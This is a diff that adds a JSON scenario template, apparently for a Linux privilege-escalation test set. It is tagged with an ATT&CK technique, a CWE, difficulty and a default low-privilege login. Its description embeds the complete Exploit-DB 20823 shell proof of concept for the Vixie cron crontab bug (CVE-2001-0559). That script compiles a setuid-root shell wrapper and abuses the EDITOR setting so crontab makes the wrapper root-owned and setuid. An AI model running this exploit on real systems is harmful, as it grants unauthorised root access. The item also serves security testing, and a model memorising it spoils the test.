@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_20823",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Vixie Cron crontab 3.0 - Privilege Lowering Failure (2) (CVE-2001-0559;OSVDB-1813)\n\nExploit source code (20823.sh):\n```\nsource: https://www.securityfocus.com/bid/2687/info\n\nVixie cron is an implementation of the popular UNIX program that runs user-specified programs at periodic scheduled times.\n\nWhen a parsing error occurs after a modification operation, crontab will fail to drop privileges correctly for subsequent modification operations.\n\nThis vulnerability may be exploited to gain root privileges locally.\n\n#!/bin/sh\n#\n# cronboom - simple proof-of-concept exploit for vixie cron version 3.1pl1\n#\n# synopsis:\n#   the crontab file maintenance program (crontab) fails to drop privileges\n#   before invoking the editor under certain circumstances.\n#\n# description:\n#   a serialization error exists in some versions of the file maintenance\n#   program, crontab.  the vulnerability was introduced in versions which\n#   were patched for seperate vulnerability in fall of 2000 (see Bugtraq\n#   ID #1960).\n#\n#   when a parsing error occurs after a modification operation, crontab will\n#   fail to drop privileges correctly for subsequent modification operations.\n#   because the program is installed setuid root, it may be possible for a\n#   local user to gain root privileges.\n#\n# affected versions:\n#   cron_3.0pl1-57.2 distributed with Debian Linux 2.2.\n#\n#   note that copies of the program with the patch mentioned above are likely\n#   to also be vulnerable.\n#\n# references:\n#   https://www.securityfocus.com/bid/2687\n#\n# 05/07/01 cairnsc@securityfocus.com\n\nCRONTAB=/usr/bin/crontab\n\nif ! test -x $CRONTAB; then\n  echo \"** unable to locate crontab executable, exiting\"\n  exit 1\nfi\n\ncat > vcsh.c << EOF\n#include <unistd.h>\n\nint main() {\n    setuid(0);\n    setgid(0);\n    execl(\"/bin/sh\", \"sh\", NULL);\n}\nEOF\n\necho \"** compiling shell wrapper as $PWD/vcsh\"\ncc -o $PWD/vcsh $PWD/vcsh.c\n\nif ! test -x $PWD/vcsh; then\n  echo \"** compilation failed, exiting\"\n  exit 1\nfi\n\necho \"** creating simple exploit script as $PWD/vcex.sh\"\ncat > vcex.sh << EOF\n#!/bin/sh\n\nsleep 1 && echo \"foo\" >> \\$1\n\nif test -f $PWD/vcboom; then\n  chown root.root $PWD/vcsh\n  chmod 4755 $PWD/vcsh\n  rm $PWD/vcboom\nelse\n  touch $PWD/vcboom\nfi\nEOF\n\nchmod 0755 $PWD/vcex.sh\n\necho \"** running $CRONTAB -e\"\necho \"**\"\necho \"** enter 'yes' at the first prompt, then enter 'no' at the second\"\necho\n\n(EDITOR=$PWD/vcex.sh $CRONTAB -e)\n\necho\necho \"** done, the shell wrapper should be suid root\"\nexit 0\n```",
+  "cve": "CVE-2001-0559;OSVDB-1813",
+  "exploitdb_id": "20823",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_20823",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
